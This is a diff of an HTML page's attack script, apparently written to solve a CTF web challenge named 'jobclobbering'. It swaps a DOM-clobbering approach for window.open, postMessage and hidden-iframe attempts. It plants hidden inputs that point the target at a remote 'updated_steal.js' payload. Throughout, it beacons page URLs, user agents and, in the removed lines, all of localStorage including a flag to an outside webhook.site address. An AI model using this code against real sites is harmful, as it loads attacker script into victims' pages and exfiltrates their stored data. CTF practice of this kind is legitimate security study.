@@ -48,7 +48,7 @@
          </div>
 
          <script>
-             console.log('DIRECT DOM CLOBBERING STRATEGY');
+             console.log('WINDOW OPENER EXPLOIT STRATEGY');
 
              // CORS-FREE webhook function
              function sendWebhook(data) {
@@ -58,7 +58,7 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/direct-strategy?' +
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/opener-strategy?' +
      params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
@@ -67,7 +67,7 @@
 
              // Send initial confirmation
              sendWebhook({
-                 status: 'DIRECT_DOM_CLOBBERING_START',
+                 status: 'WINDOW_OPENER_EXPLOIT_START',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
                  current_url: window.location.href,
@@ -76,141 +76,134 @@
                  user_agent: navigator.userAgent
              });
 
-             // If we're on GitHub Pages, redirect to CTF with fragment
-             if (window.location.hostname === 'gavinyw.github.io') {
-                 sendWebhook({
-                     status: 'ON_GITHUB_PAGES_REDIRECTING_TO_CTF',
-                     timestamp: new Date().toISOString()
-                 });
+             // Strategy: Open CTF site in new window and manipulate it
+             setTimeout(() => {
+                 try {
+                     // Open the CTF site with #messages to trigger loadMessageBoardJS
+                     const ctfUrl = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
 
-                 // Create a URL that includes DOM clobbering data in the fragment
-                 const ctfUrl = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
-
-                 setTimeout(() => {
                      sendWebhook({
-                         status: 'REDIRECTING_TO_CTF_MESSAGES_SECTION',
+                         status: 'OPENING_CTF_WINDOW',
                          timestamp: new Date().toISOString(),
                          target_url: ctfUrl
                      });
 
-                     window.location.href = ctfUrl;
-                 }, 2000);
+                     const ctfWindow = window.open(ctfUrl, '_blank');
 
-             } else if (window.location.hostname.includes('jobclobbering') ||
-     window.location.hostname.includes('chal.secjhu.club')) {
-                 // We're on the CTF domain - execute the attack!
-                 sendWebhook({
-                     status: 'ON_CTF_DOMAIN_EXECUTING_ATTACK',
-                     timestamp: new Date().toISOString(),
-                     domain: window.location.hostname,
-                     full_url: window.location.href
-                 });
+                     if (ctfWindow) {
+                         sendWebhook({
+                             status: 'CTF_WINDOW_OPENED_SUCCESSFULLY',
+                             timestamp: new Date().toISOString()
+                         });
 
-                 // Make sure DOM clobbering element exists
-                 if (!window.utilsJS) {
-                     const input = document.createElement('input');
-                     input.id = 'utilsJS';
-                     input.name = 'url';
-                     input.value = 'https://gavinyw.github.io/resume-portfolio/updated_steal.js';
-                     input.style.cssText = 'position:fixed;left:-9999px;opacity:0;';
-                     document.body.appendChild(input);
+                         // Wait for the window to load, then try to inject DOM clobbering
+                         setTimeout(() => {
+                             try {
+                                 // Try to access the CTF window (might fail due to same-origin policy)
+                                 if (ctfWindow.document) {
+                                     sendWebhook({
+                                         status: 'CTF_WINDOW_ACCESSIBLE',
+                                         timestamp: new Date().toISOString()
+                                     });
 
-                     sendWebhook({
-                         status: 'DOM_CLOBBERING_ELEMENT_INJECTED',
-                         timestamp: new Date().toISOString(),
-                         payload_url: input.value
-                     });
-                 }
+                                     // Inject DOM clobbering element into CTF window
+                                     const input = ctfWindow.document.createElement('input');
+                                     input.id = 'utilsJS';
+                                     input.name = 'url';
+                                     input.value = 'https://gavinyw.github.io/resume-portfolio/updated_steal.js';
+                                     input.style.cssText = 'position:fixed;left:-9999px;opacity:0;';
+                                     ctfWindow.document.body.appendChild(input);
 
-                 // Wait a moment, then trigger the vulnerable function
-                 setTimeout(() => {
-                     try {
-                         // Try to call the vulnerable function directly
-                         if (typeof loadMessageBoardJS === 'function') {
-                             sendWebhook({
-                                 status: 'CALLING_VULNERABLE_FUNCTION_DIRECTLY',
-                                 timestamp: new Date().toISOString()
-                             });
-                             loadMessageBoardJS();
-                         } else {
-                             // Function not available, simulate it
-                             sendWebhook({
-                                 status: 'SIMULATING_VULNERABLE_FUNCTION',
-                                 timestamp: new Date().toISOString()
-                             });
+                                     sendWebhook({
+                                         status: 'DOM_CLOBBERING_INJECTED_INTO_CTF_WINDOW',
+                                         timestamp: new Date().toISOString(),
+                                         payload_url: input.value
+                                     });
 
-                             let utilJS = window.utilsJS || {};
-                             if (utilJS.url || utilJS.value) {
-                                 const script = document.createElement('script');
-                                 script.src = utilJS.url || utilJS.value;
-                                 document.body.appendChild(script);
-
+                                     // Try to trigger the vulnerable function
+                                     if (typeof ctfWindow.loadMessageBoardJS === 'function') {
+                                         ctfWindow.loadMessageBoardJS();
+                                         sendWebhook({
+                                             status: 'VULNERABLE_FUNCTION_CALLED_IN_CTF_WINDOW',
+                                             timestamp: new Date().toISOString()
+                                         });
+                                     }
+                                 } else {
+                                     sendWebhook({
+                                         status: 'CTF_WINDOW_NOT_ACCESSIBLE_SAME_ORIGIN_POLICY',
+                                         timestamp: new Date().toISOString()
+                                     });
+                                 }
+                             } catch(e) {
                                  sendWebhook({
-                                     status: 'PAYLOAD_SCRIPT_INJECTED_ON_CTF_DOMAIN',
+                                     status: 'ERROR_ACCESSING_CTF_WINDOW',
                                      timestamp: new Date().toISOString(),
-                                     script_src: script.src
+                                     error: e.message
                                  });
                              }
-                         }
-                     } catch(e) {
+                         }, 3000);
+
+                         // Also try postMessage communication
+                         setTimeout(() => {
+                             try {
+                                 ctfWindow.postMessage({
+                                     type: 'DOM_CLOBBER_REQUEST',
+                                     utilsJS_url: 'https://gavinyw.github.io/resume-portfolio/updated_steal.js'
+                                 }, '*');
+
+                                 sendWebhook({
+                                     status: 'POSTMESSAGE_SENT_TO_CTF_WINDOW',
+                                     timestamp: new Date().toISOString()
+                                 });
+                             } catch(e) {
+                                 sendWebhook({
+                                     status: 'ERROR_SENDING_POSTMESSAGE',
+                                     timestamp: new Date().toISOString(),
+                                     error: e.message
+                                 });
+                             }
+                         }, 4000);
+
+                     } else {
                          sendWebhook({
-                             status: 'ERROR_CALLING_VULNERABLE_FUNCTION',
-                             timestamp: new Date().toISOString(),
-                             error: e.message
+                             status: 'FAILED_TO_OPEN_CTF_WINDOW',
+                             timestamp: new Date().toISOString()
                          });
                      }
-                 }, 1000);
 
-                 // Also try to extract flag immediately since we're on CTF domain
-                 setTimeout(() => {
-                     try {
-                         const flag = localStorage.getItem('flag');
-                         const allStorage = {};
-                         for (let i = 0; i < localStorage.length; i++) {
-                             const key = localStorage.key(i);
-                             allStorage[key] = localStorage.getItem(key);
-                         }
+                 } catch(e) {
+                     sendWebhook({
+                         status: 'ERROR_OPENING_CTF_WINDOW',
+                         timestamp: new Date().toISOString(),
+                         error: e.message
+                     });
+                 }
+             }, 2000);
 
-                         sendWebhook({
-                             status: 'DIRECT_FLAG_EXTRACTION_ON_CTF_DOMAIN',
-                             timestamp: new Date().toISOString(),
-                             flag: flag || 'not_found',
-                             all_localStorage: JSON.stringify(allStorage),
-                             localStorage_length: localStorage.length,
-                             domain: window.location.hostname
-                         });
-
-                         if (flag) {
-                             sendWebhook({
-                                 status: 'FLAG_CAPTURED_FROM_CTF_DOMAIN',
-                                 flag: flag,
-                                 timestamp: new Date().toISOString(),
-                                 success: true
-                             });
-                         }
-                     } catch(e) {
-                         sendWebhook({
-                             status: 'ERROR_EXTRACTING_FLAG',
-                             timestamp: new Date().toISOString(),
-                             error: e.message
-                         });
-                     }
-                 }, 2000);
-
-             } else {
-                 // Unknown domain
+             // Listen for messages from the CTF window
+             window.addEventListener('message', function(event) {
                  sendWebhook({
-                     status: 'UNKNOWN_DOMAIN',
+                     status: 'MESSAGE_RECEIVED_FROM_CTF_WINDOW',
                      timestamp: new Date().toISOString(),
-                     domain: window.location.hostname
+                     message_origin: event.origin,
+                     message_data: JSON.stringify(event.data)
                  });
-             }
 
-             // General DOM clobbering attempt regardless of domain
+                 if (event.data && event.data.flag) {
+                     sendWebhook({
+                         status: 'FLAG_RECEIVED_VIA_POSTMESSAGE',
+                         timestamp: new Date().toISOString(),
+                         flag: event.data.flag,
+                         source_origin: event.origin
+                     });
+                 }
+             });
+
+             // Fallback: Also try direct DOM clobbering on current page
              setTimeout(() => {
                  if (window.utilsJS && (window.utilsJS.url || window.utilsJS.value)) {
                      sendWebhook({
-                         status: 'GENERAL_DOM_CLOBBERING_ATTEMPT',
+                         status: 'FALLBACK_DOM_CLOBBERING_ON_GITHUB_PAGES',
                          timestamp: new Date().toISOString(),
                          script_url: window.utilsJS.url || window.utilsJS.value
                      });
@@ -219,7 +212,57 @@
                      script.src = window.utilsJS.url || window.utilsJS.value;
                      document.body.appendChild(script);
                  }
-             }, 3000);
+             }, 5000);
+
+             // Try iframe approach as another fallback
+             setTimeout(() => {
+                 try {
+                     const iframe = document.createElement('iframe');
+                     iframe.src = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
+                     iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
+                     document.body.appendChild(iframe);
+
+                     sendWebhook({
+                         status: 'IFRAME_CREATED_FOR_CTF_SITE',
+                         timestamp: new Date().toISOString()
+                     });
+
+                     // Try to access iframe after load
+                     iframe.onload = function() {
+                         try {
+                             if (iframe.contentWindow && iframe.contentWindow.document) {
+                                 const input = iframe.contentWindow.document.createElement('input');
+                                 input.id = 'utilsJS';
+                                 input.name = 'url';
+                                 input.value = 'https://gavinyw.github.io/resume-portfolio/updated_steal.js';
+                                 input.style.cssText = 'position:fixed;left:-9999px;opacity:0;';
+                                 iframe.contentWindow.document.body.appendChild(input);
+
+                                 sendWebhook({
+                                     status: 'DOM_CLOBBERING_INJECTED_VIA_IFRAME',
+                                     timestamp: new Date().toISOString()
+                                 });
+
+                                 if (typeof iframe.contentWindow.loadMessageBoardJS === 'function') {
+                                     iframe.contentWindow.loadMessageBoardJS();
+                                 }
+                             }
+                         } catch(e) {
+                             sendWebhook({
+                                 status: 'IFRAME_ACCESS_BLOCKED_SAME_ORIGIN',
+                                 timestamp: new Date().toISOString(),
+                                 error: e.message
+                             });
+                         }
+                     };
+                 } catch(e) {
+                     sendWebhook({
+                         status: 'ERROR_CREATING_IFRAME',
+                         timestamp: new Date().toISOString(),
+                         error: e.message
+                     });
+                 }
+             }, 6000);
          </script>
      </body>
      </html>
